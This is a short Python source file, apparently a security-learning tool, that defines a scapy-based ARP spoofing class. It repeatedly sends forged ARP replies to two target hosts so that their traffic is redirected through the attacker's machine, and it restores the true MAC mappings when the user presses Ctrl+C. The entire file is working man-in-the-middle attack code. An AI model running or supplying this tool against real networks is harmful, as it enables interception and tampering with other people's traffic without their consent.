import scapy.all as scapy
import signal
import time


class ArpSpoofer:

    def __init__(self, target_1_ip, target_2_ip):
        self.target_1 = {"IP": target_1_ip, "MAC": scapy.getmacbyip(target_1_ip)}
        self.target_2 = {"IP": target_2_ip, "MAC": scapy.getmacbyip(target_2_ip)}
        self.continue_attack_loop = True
        # Initialize signal to undo spoof on Ctrl + C #
        signal.signal(signal.SIGINT, self.signal_handler)

    def print_setup(self):
        print("The current setup defined for this attack is: ")
        print("Target n°1 MAC: ", self.target_1["MAC"])
        print("Target n°1 IP: ", self.target_1["IP"])
        print("Target n°2 MAC: ", self.target_2["MAC"])
        print("Target n°2 IP: ", self.target_2["IP"])

    def change_target_1(self, new_ip):
        self.target_1["IP"] = new_ip
        self.target_1["MAC"] = scapy.getmacbyip(new_ip)

    def change_target_2(self, new_ip):
        self.target_2["IP"] = new_ip
        self.target_2["MAC"] = scapy.getmacbyip(new_ip)

    def signal_handler(self, signal, frame):
        print("\nProgram exiting gracefully and MAC spoof is being undone...")
        self.undo_spoof()
        self.continue_attack_loop = False

    def spoof(self):
        pckt_to_t1 = scapy.ARP(op="is-at", hwdst=self.target_1["MAC"], psrc=self.target_2["IP"],
                               pdst=self.target_1["IP"])
        pckt_to_t2 = scapy.ARP(op="is-at", hwdst=self.target_2["MAC"], psrc=self.target_1["IP"],
                               pdst=self.target_2["IP"])
        scapy.sr(pckt_to_t1, timeout=5, verbose=False)
        scapy.sr(pckt_to_t2, timeout=5, verbose=False)

    def undo_spoof(self):
        pckt_to_t1 = scapy.ARP(op="is-at", hwsrc=self.target_2["MAC"], hwdst=self.target_1["MAC"],
                               psrc=self.target_2["IP"], pdst=self.target_1["IP"])
        pckt_to_t2 = scapy.ARP(op="is-at", hwsrc=self.target_1["MAC"], hwdst=self.target_2["MAC"],
                               psrc=self.target_1["IP"], pdst=self.target_2["IP"])
        scapy.sr(pckt_to_t1, timeout=5, verbose=False)
        scapy.sr(pckt_to_t2, timeout=5, verbose=False)

    def attack(self):
        self.print_setup()
        print("#### Press Ctrl+C to finish the attack ####")
        while self.continue_attack_loop:
            self.spoof()
            time.sleep(1)
